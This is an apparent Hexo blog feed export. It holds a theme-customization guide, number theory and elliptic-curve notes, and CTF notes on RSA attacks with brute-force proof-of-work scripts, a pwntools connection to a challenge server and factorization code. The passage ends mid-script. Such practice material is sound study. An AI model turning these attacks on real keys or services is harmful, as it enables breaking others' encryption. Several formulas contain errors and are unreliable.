language_">window</span>.<span class="property">msRequestAnimationFrame</span>||<span class="keyword">function</span>(<span class="params">n</span>)&#123;<span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(n,<span class="number">1e3</span>/<span class="number">45</span>)&#125;,x=<span class="title class_">Math</span>.<span class="property">random</span>,w=&#123;<span class="attr">x</span>:<span class="literal">null</span>,<span class="attr">y</span>:<span class="literal">null</span>,<span class="attr">max</span>:<span class="number">2e4</span>&#125;;u.<span class="property">id</span>=d,u.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;position:fixed;top:0;left:0;z-index:&quot;</span>+m.<span class="property">z</span>+<span class="string">&quot;;opacity:&quot;</span>+m.<span class="property">o</span>,<span class="title function_">e</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(u),<span class="title function_">o</span>(),<span class="variable language_">window</span>.<span class="property">onresize</span>=o,<span class="variable language_">window</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">n</span>)&#123;n=n||<span class="variable language_">window</span>.<span class="property">event</span>,w.<span class="property">x</span>=n.<span class="property">clientX</span>,w.<span class="property">y</span>=n.<span class="property">clientY</span>&#125;,<span class="variable language_">window</span>.<span class="property">onmouseout</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;w.<span class="property">x</span>=<span class="literal">null</span>,w.<span class="property">y</span>=<span class="literal">null</span>&#125;;<span class="keyword">for</span>(<span class="keyword">var</span> y=[],s=<span class="number">0</span>;m.<span class="property">n</span>&gt;s;s++)&#123;<span class="keyword">var</span> f=<span class="title function_">x</span>()*c,h=<span class="title function_">x</span>()*a,g=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>,p=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>;y.<span class="title function_">push</span>(&#123;<span class="attr">x</span>:f,<span class="attr">y</span>:h,<span class="attr">xa</span>:g,<span class="attr">ya</span>:p,<span class="attr">max</span>:<span class="number">6e3</span>&#125;)&#125;<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">i</span>()&#125;,<span class="number">100</span>)&#125;();</span><br></pre></td></tr></table></figure>

<h2 id="add-path"><a href="#add-path" class="headerlink" title="add path"></a>add path</h2><p>My NexT layout file is in the path <code>themes\next\layout\_layout.njk</code>.</p>
<p>For we created the js file, we saved as <code>canvas-nest.js</code>. Open the <code>_layout.njk</code>, and add the following words. <em>REMEMBER above the <code>&lt;/body&gt;</code></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Background picture --&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;/js/canvas-nest.js&quot;&gt;	   &lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="ICON"><a href="#ICON" class="headerlink" title="ICON"></a>ICON</h1><blockquote>
<p><a href="https://fontawesome.com/search">https://fontawesome.com/search</a></p>
</blockquote>
<h1 id="ATTACH-FILES"><a href="#ATTACH-FILES" class="headerlink" title="ATTACH FILES"></a>ATTACH FILES</h1><p>We may hope visitors that can download files easily and conveniently. Thus, we can upload our relating files onto the same name file. Eg. The post is named <code>22-10-21-hexo-build-beautify.md</code>, and its same name file is <code>22-10-21-hexo-build-beautify</code>. They are created at the same time. </p>
<p>After uploading, and you can quote the file path in the post. And we can download these things while visiting. </p>
<ul>
<li>Picture <code>![filename](filepath)</code></li>
<li>Zip <code>[filename](filepath)</code></li>
<li>……</li>
</ul>
<p><em>At the same path!</em></p>
<h1 id="FOLK-ME"><a href="#FOLK-ME" class="headerlink" title="FOLK  ME"></a>FOLK  ME</h1><p>The function is in<code>layout.njk</code>.</p>
<p>in <code>headband</code> module add the following code: </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;your url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;<span class="number">0%</span>,<span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;<span class="number">20%</span>,<span class="number">60%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;<span class="number">40%</span>,<span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ensure that the <code>pjax</code> in <code>_config.next.yml</code> is <code>true</code></p>
<h1 id="TITLE-CASE"><a href="#TITLE-CASE" class="headerlink" title="TITLE CASE"></a>TITLE CASE</h1><p>to make the titles follow the standard of title, we can turn the <code>titlecase</code> into <code>true</code></p>
<img src="/2022/10/21/22-10-21-hexo-build-beautify/1.png" class="" title="image-20230224144610422">



<h1 id="DAY-x2F-NIGHT-MODE"><a href="#DAY-x2F-NIGHT-MODE" class="headerlink" title="DAY&#x2F;NIGHT MODE"></a>DAY&#x2F;NIGHT MODE</h1><blockquote>
<p><a href="https://www.techgrow.cn/posts/abf4aee1.html">Hexo Next 8.x 主题添加可切换的暗黑模式 | Clay 的技术博客 (techgrow.cn)</a></p>
</blockquote>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>self_promtion</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Math</title>
    <url>/2022/11/15/22-11-15-math/</url>
    <content><![CDATA[<p>Some import theorems which are suitable for applying to Cryptography.</p>
<p>At the same time, the post which is made as the record to note me that how to improve or deduction. </p>
<span id="more"></span><!--toc-->

<h1 id="Fermat’s-little-theorem"><a href="#Fermat’s-little-theorem" class="headerlink" title="Fermat’s little theorem"></a>Fermat’s little theorem</h1><p>Let $p$ be a prime number,  and $a$ be any integer. Then $a^{p} - a$ is always divisible by $p$. </p>
<p>And we can write as:<br>$$<br>a^{p} \equiv a \mod p<br>$$<br>Make a deduction, we can get that:<br>$$<br>a^{p-1} \equiv 1 \mod p<br>$$</p>
<h1 id="Euler’s-criterion"><a href="#Euler’s-criterion" class="headerlink" title="Euler’s criterion"></a>Euler’s criterion</h1><p>If the modulo $p$ is a odd prime and is prime to $a$, we can get $a^{p-1}\equiv 1 \mod p$ by using the fermat’s little theorem. </p>
<p>We define that $p &#x3D; 2q + 1$， and we will get $a^{2q} \equiv 1 \mod p$:<br>$$<br>\Longrightarrow (a^{2q} - 1) \times (2^{2q} + 1) \equiv 0 \mod p<br>$$<br>So the $a^q \equiv \pm 1 \mod p$，means that $a^{\frac{p-1}{2}} \equiv \pm 1 \mod p$. </p>
<p>In fact, we have the equation which is called euler’s criterion.<br>$$<br>(\frac{a}{p}) \equiv a^{\frac{p - 1}{2}} \mod p<br>$$</p>
<h1 id="Groups-and-Abelian-group"><a href="#Groups-and-Abelian-group" class="headerlink" title="Groups and Abelian group"></a>Groups and Abelian group</h1><p>Usually needs to satisfy the qualities below.</p>
<p>首先说下群论的基础。代数中的群简单来说就是一组元素集合和定义在元素上的运算。比如说全体整数构成了一个群，运算包括加法等。这里的集合用 G（group）表示，集合要变成群，一般要满足以下性质：</p>
<ol>
<li>封闭性：如果 $a$ 和 $b$ 都属于 $G$ 集合，那么 $a+b$ 也属于$G$;</li>
<li>结合律：$(a+b)+c&#x3D;a+(b+c)$</li>
<li>存在单位元（<em>在二元运算中，单位元指与任意元素运算不改变其值的元素，以实数为例，乘法单位元为1，加法单位元为0</em>）$O$ 使得$a+O&#x3D;O+a&#x3D;a$ ;</li>
</ol>
<p>4.每个元素都存在逆元素，就是说对于任意元素 $a$ 必存在 $b$ 使得 $a+b&#x3D;O$ ($O$是单位元) 。</p>
<p>集合满足以上四个性质就是称为群，还有一些特殊的群，如阿贝尔群（Abelian Group）除了满足群的基本性质，还满足交换律即：<br>$$<br>a+b&#x3D;b+a<br>$$<br>故阿贝尔群又称交换群。根据这些性质，我们可以知道整数集Z是一个阿贝尔群，自然数集N却并不是一个群，因为它不满足第四条性质。</p>
<h2 id="Elliptic-Curve-Group"><a href="#Elliptic-Curve-Group" class="headerlink" title="Elliptic Curve Group"></a>Elliptic Curve Group</h2><p><strong>椭圆曲线上的群元素是椭圆曲线上的点</strong> 单位元是无穷远点记为 $O$</p>
<p>任意点 $P$ 的逆是该点关于 $x$  轴对称点。</p>
<p>椭圆曲线群的加法也不同于整数的加法，它的加法定义可以描述为：</p>
<p>给定三个共线非零的点 $P$ ，$Q$，$R$ ，它们的和为 $P+Q+R&#x3D;O$。</p>
<h3 id="几何意义"><a href="#几何意义" class="headerlink" title="几何意义"></a>几何意义</h3><p>过 $𝑃$ 、$𝑄$ 两点做直线 $𝐿$，与椭圆曲线相交于第三点，该点关于 $x$ 轴的对称点即是所求的 $𝑅$ 点。椭圆曲线的这种加法运算有比较明确的几何含义。</p>
<h3 id="异常情况"><a href="#异常情况" class="headerlink" title="异常情况"></a>异常情况</h3><ol>
<li>$𝑂+𝑂&#x3D;𝑂$，对任意的 $𝑃$，有 $𝑃+𝑂&#x3D;𝑃$ ；$𝑂$看做零点</li>
<li>$𝑃&#x3D;(𝑥,𝑦)$ 的负元是关于 $x$ 中对称的点 $−𝑃&#x3D;(𝑥,−𝑦)$（而不是关于原点对称），$𝑃+(−𝑃)&#x3D;𝑂$，可以看做 $P$ 与 $-P$ 连线与椭圆曲线相交于无穷远点</li>
<li>计算 $𝑃$ 点（$𝑃≠𝑂$）的两倍时，是做该点的切线，再取切线与椭圆曲线交点 $𝑆$ 关于 $x$ 轴的对称点$−𝑆$，也即是 $2𝑃&#x3D;𝑃+𝑃&#x3D;−𝑆$ ，得出2倍值可以递推到若干倍。</li>
</ol>
<p>可以看出，椭圆曲线的点集（包含无穷远点$O$）和上述定义的加法运算构成了一个阿贝尔群：<br>单位元是 $𝑂$ 点，$𝑃(𝑥,𝑦)$ 的逆元是 $𝑃(𝑥,−𝑦)$ ，封闭性，结合性以及交换性也是显然满足的。</p>
<h3 id="椭圆曲线代数计算"><a href="#椭圆曲线代数计算" class="headerlink" title="椭圆曲线代数计算"></a>椭圆曲线代数计算</h3><p>几何解释主要方便理解椭圆曲线的加法意义，代数便于计算。过曲线 $P(x_p, y_p)$以及 $Q(x_q, y_q)$两点（*$P$ 与 $Q$ 不互为负元*）做直线，求第三个交点很容易用代数求解出来。<br>$$<br>y^2 &#x3D; x_3 + ax + b \tag{1}<br>$$</p>
<p>$$<br>y - y_p &#x3D; k(x - x_p) \tag{2}<br>$$</p>
<p>于是斜率为$k &#x3D; \frac{y_q - y_p}{x_q - x_p}$（ $P$ 与 $Q$ 不同点）&#x2F; $k &#x3D; \frac{3x_{q}^2 + a}{3y_p}$（ $P$ 与 $Q$ 相同点） 。</p>
<p>将$(2)$代入$(1)$再利用次数对齐的方法从而求得第三个交点的对称点，也就是$P,Q$之和$R(x_r, y_r)$为：<br>$$<br>x_r &#x3D; k^2 - x_p - x_q<br>$$</p>
<p>$$<br>y_r &#x3D; -y_p + k(x_p - x_r)<br>$$</p>
<p>如果 $P &#x3D; Q$，则两者相加为倍乘运算。例如 $P+P &#x3D; 2P &#x3D; R$。<br>$$<br>x_r &#x3D; ((3x_p^{2} + a)&#x2F;2y_p)^2 - 2x_p<br>$$</p>
<p>$$<br>y_r &#x3D; ((3x_p^{2} + a)&#x2F;2y_p)(x_p - x_r) - y_p<br>$$</p>
<ul>
<li><a href="https://learnblockchain.cn/article/1549">https://learnblockchain.cn/article/1549</a></li>
</ul>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-04-RSA</title>
    <url>/2022/11/04/22-11-04-RSA/</url>
    <content><![CDATA[<p><strong>JUST</strong> conclude the attacks about RSA. </p>
<p>Make a record for myself. </p>
<span id="more"></span>



<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><ul>
<li>produce large primes $p$ and $q$</li>
<li>calculate $n &#x3D; p \times q$</li>
<li>use <strong>Euler’s totient function</strong> to get $\varphi(n) &#x3D; (p-1) \times (q-1)$, in code we usually use $N$ or $phi$</li>
<li>define $e$ which satisfies the condition that $gcd(e, \varphi(n)) &#x3D; 1$, and the $e$ is between 1 and $\varphi(n)$</li>
<li>calculate $d$ and the $d$ comes from $de \equiv 1 \mod \varphi(n)$</li>
<li><strong>encrypt: $c \equiv m^{e} \mod n$</strong></li>
<li><strong>decrypt: $m \equiv c^{d} \mod n$</strong></li>
<li>PUBLICKEY: PU{e, n}</li>
<li>PRIVATEKEY: PR{p, q, d}</li>
</ul>
<h2 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h2><p>$$<br>m \equiv c^{d} \mod n \equiv m^{de} \mod n \equiv m^{k\varphi(n) + 1} \mod n \equiv m \mod n<br>$$</p>
<p>use the <strong>Fermat’s little theorem</strong> deduce:<br>$$<br>m^{n} \equiv m \mod n\<br>$$</p>
<p>$$<br>m^{n-1} \equiv m^{\varphi(n)} \equiv 1 \mod n\<br>$$</p>
<h3 id="m-n-are-relatively-prime"><a href="#m-n-are-relatively-prime" class="headerlink" title="$m$, $n$ are relatively-prime"></a>$m$, $n$ are relatively-prime</h3><p>the $m^{k\varphi(n)}$:<br>$$<br>m^{k\varphi(n)} \equiv 1\mod n\<br>$$</p>
<p>$$<br>\Longrightarrow m^{k\varphi(n) + 1} \equiv m \mod n<br>$$</p>
<h3 id="m-n-not-relatively-prime"><a href="#m-n-not-relatively-prime" class="headerlink" title="$m$,$n$ not relatively-prime"></a>$m$,$n$ not relatively-prime</h3><p>preparation:<br>$$<br>gcd(m, n) \neq 1\<br>$$<br>$$<br>n &#x3D; p \times q\<br>$$</p>
<p>$$<br>\Longrightarrow n &#x3D; kp\<br>$$</p>
<p>$$<br>k, p \ are \ relatively-prime<br>$$</p>
<p>also <strong>Fermat’s little theorem</strong>:<br>$$<br>(kp)^{q-1} \equiv 1 \mod q<br>$$<br>based on the properties of con-gruences multiplication property:<br>$$<br>(kp)^{(p-1)\times (q-1) \times k} (kp) \equiv (kp) \mod q<br>$$<br>substitute the $\varphi(n)$ and $de \equiv 1 \mod \varphi(n)$:<br>$$<br>\varphi(n) &#x3D; (p-1) \times (q-1)\<br>$$<br>$$<br>de &#x3D; 1 + k \times \varphi(n)\<br>$$</p>
<p>$$<br>\Longrightarrow (kp)^{de} \equiv (kp) \mod q\<br>$$</p>
<p>$$<br>\Longrightarrow (kp)^{de}&#x3D;kp + tq<br>$$</p>
<p>thus, $tq | kq$ and $t|p$ for $q$ is prime:<br>$$<br>assume: t &#x3D; t\times p\<br>$$<br>$$<br>(kp)^{de} &#x3D; tq + kp &#x3D; t\times p\times q + k \times p &#x3D; tn + kp\<br>$$</p>
<p>$$<br>(kp)^{de} &#x3D; m + tn \equiv m \mod n<br>$$</p>
<p>proved.</p>
<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><ul>
<li>gmpy2</li>
<li>python3.7+</li>
<li>pycharm</li>
<li>sagemath</li>
</ul>
<h1 id="NC-CHALLENGE"><a href="#NC-CHALLENGE" class="headerlink" title="NC CHALLENGE"></a>NC CHALLENGE</h1><p>Before nc real connection, you need to receive the challenge and make a solution about it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet = digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line">sha256 = <span class="string">&#x27;9a579edf6cdd9ed39efc1ccc754e7bb15d52e3d9cabcd66c7042fa1a59fc2836&#x27;</span></span><br><span class="line">tail = <span class="string">&#x27;j60BfGY9sSnkMi9H&#x27;</span></span><br><span class="line">xxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha = hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha == sha256):</span><br><span class="line">        xxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 爆破sha256+hex</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1</span>(<span class="params">pre, target</span>):</span><br><span class="line">    pre = codecs.decode(pre.encode(), <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        skr = pre + <span class="string">b&#x27;&#x27;</span>.join([t.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> t <span class="keyword">in</span> x])</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(skr).hexdigest() == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;find <span class="subst">&#123;skr&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> codecs.encode(skr, <span class="string">&#x27;hex&#x27;</span>).decode()</span><br></pre></td></tr></table></figure>

<p><em>change sha256&#x2F;tail and crack xxxx</em></p>
<p>Or use the connecting function: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28826</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sha256(XXXX&#x27;</span>)</span><br><span class="line">    line = r.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    tmp = line[line.find(<span class="string">&#x27;+&#x27;</span>) + <span class="number">1</span>:line.find(<span class="string">&#x27;)&#x27;</span>)]</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    aim = line[line.find(<span class="string">&#x27;== &#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">    <span class="built_in">print</span>(aim)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    ans = i + j + k + l</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256((ans + tmp).encode()).hexdigest() == aim:</span><br><span class="line">                        <span class="built_in">print</span>(ans)</span><br><span class="line">                        r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">                        r.sendline(ans.encode())</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">proof()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="MODULUS-FACTORIZATION"><a href="#MODULUS-FACTORIZATION" class="headerlink" title="MODULUS FACTORIZATION"></a>MODULUS FACTORIZATION</h1><p>Or we can call it <code>Original_RSA</code>. </p>
<p>The main target in RSA problems is to factorize <code>n</code> to <code>p</code> and <code>q</code>. </p>
<p>Here is the code of <code>Original_RSA</code> which is the basic attack among RSA attacks.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p, q, e, c, n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)    </span><br><span class="line">    d = <span class="built_in">int</span>(gmpy2.invert(e,N))  <span class="comment"># mpz() may run error, convert to int()</span></span><br><span class="line">    <span class="comment"># d = gmpy2.invert(e,N)</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><strong>BUT HOW TO FACTORIZE THE $n$?</strong></p>
<p>It is the significant question. Follows are some solutions that I met.</p>
<h2 id="Factorize"><a href="#Factorize" class="headerlink" title="Factorize"></a>Factorize</h2><h3 id="factordb"><a href="#factordb" class="headerlink" title="factordb"></a>factordb</h3><blockquote>
<p><a href="http://factordb.com/">factordb.com</a></p>
</blockquote>
<p>A database contains many $n$ that has been factorized.</p>
<h3 id="yafu-x64"><a href="#yafu-x64" class="headerlink" title="yafu-x64"></a>yafu-x64</h3><p>The $p$,$q$ differ very well or a little or $p$,$q$  are smooth and produced by $\rho -1 $or $\rho + 1 $.</p>
<p><strong>usage</strong></p>
<ul>
<li><p>yafu-x64 factor()</p>
</li>
<li><p>yafu-x64 factor(@) -batchfile [filename] <em>!remember the number saved in file and need a <code>\n</code></em></p>
</li>
</ul>
<h3 id="msieve153"><a href="#msieve153" class="headerlink" title="msieve153"></a>msieve153</h3><p>Which is similar to yafu-x64</p>
<h3 id="RSAConverter"><a href="#RSAConverter" class="headerlink" title="RSAConverter"></a>RSAConverter</h3><p>Based on CRT. </p>
<p><strong>usage</strong></p>
<ul>
<li><p>$n$, $d$ convert to hex and delete <code>0x</code></p>
</li>
<li><p>$e$ convert to hex and delete <code>x</code></p>
</li>
</ul>
<h3 id="fermath-factorization"><a href="#fermath-factorization" class="headerlink" title="fermath factorization"></a>fermath factorization</h3><p>p,q have a little difference</p>
<ul>
<li>p or q created by <code>next_prime()</code><ul>
<li>find the Reference Substance <code>n_2</code> which can be produced by <code>iroot(n, 2)[0]</code></li>
<li>p and q are primes, and $p&lt;n_2&lt;q$</li>
<li>we can get $q$ by <code>next_prime(n_2)</code></li>
<li>and <code>p = n // q</code></li>
</ul>
</li>
<li>p and q are similar but not neighbors<ul>
<li>also find the <code>n_2</code></li>
<li>with <code>n_2</code> as a center, step size 1 and right</li>
<li>if find $p$ and $q$ satisfied the condition, and we get the true $p$ and $q$</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fermat Factorization 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fermat Factorization</span></span><br><span class="line"><span class="string">    conditon:</span></span><br><span class="line"><span class="string">        1. n is odd</span></span><br><span class="line"><span class="string">        2. satisfy the equation (p-q)(p+q)</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: result</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b_2 = a*a - n</span><br><span class="line">        b, index = gmpy2.iroot(b_2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            result = [<span class="built_in">int</span>(a + b), <span class="built_in">int</span>(a - b)]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<p>$$<br>Prime &#x3D; k \times M + 65537^{a} \mod M<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Backdoor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    primes list can produced by primes_first_n() in sagemath</span></span><br><span class="line"><span class="string">    reference:[GKCTF2020]Backdoor</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param n:modulo</span></span><br><span class="line"><span class="string">    :return:p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    val = <span class="number">39</span> <span class="comment"># edit</span></span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    primes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>,</span><br><span class="line">              <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>,</span><br><span 